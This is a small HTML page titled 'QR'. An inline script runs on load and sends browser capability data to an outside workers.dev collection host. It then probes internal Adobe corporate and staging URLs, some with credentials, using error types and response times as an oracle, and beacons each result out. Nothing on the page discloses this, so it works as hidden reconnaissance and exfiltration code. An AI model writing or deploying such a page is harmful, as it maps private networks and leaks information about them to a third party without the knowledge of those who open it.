<!doctype html><html><head><title>QR</title></head><body>qr
<script>
(function(){
  var B='https://rzcatch.adx-f0a.workers.dev/jx4-';
  function b(t,x){ new Image().src=B+t+(x?('-'+encodeURIComponent(x).slice(0,120)):''); }
  b('boot');
  // renderer capability sweep
  try{ b('caps', ['sw:'+('serviceWorker' in navigator),'notif:'+((typeof Notification!=='undefined')?Notification.permission:'x'),'ws:'+('WebSocket' in window),'rtcp:'+(!!(window.RTCPeerConnection))].join(',')); }catch(e){b('caps-err');}
  // https internal probes — no mixed-content, error type + timing = oracle
  function probe(tag,url,cred){
    var t0=Date.now();
    try{ var c=new AbortController(); setTimeout(function(){c.abort()},8000);
      fetch(url,{mode:'cors',credentials:cred?'include':'omit',signal:c.signal})
        .then(function(r){b(tag+'-ok-'+r.status+'-'+(Date.now()-t0));})
        .catch(function(e){b(tag+'-'+(e&&e.name?e.name:'err')+'-'+(Date.now()-t0));});
    }catch(e){ b(tag+'-throw'); }
  }
  probe('pxcorp','https://stage.projectx.corp.adobe.com/',false);
  probe('ethos','https://af-spur-colligov2-stage.corp.ethos851-stage-or2.ethos.adobe.net/',false);
  probe('sensei','https://sensei.adobe.io/',false);
  probe('pxcorpC','https://stage.projectx.corp.adobe.com/',true);
  probe('ethosC','https://recolor-colligov2-stage.corp.ethos851-stage-or2.ethos.adobe.net/v2/storage/image',true);
  // control: known-public https (should be ok/quick)
  probe('ctl','https://rzcatch.adx-f0a.workers.dev/jx4-ctl-probe',false);
  setTimeout(function(){ b('done'); },12000);
})();
</script></body></html>
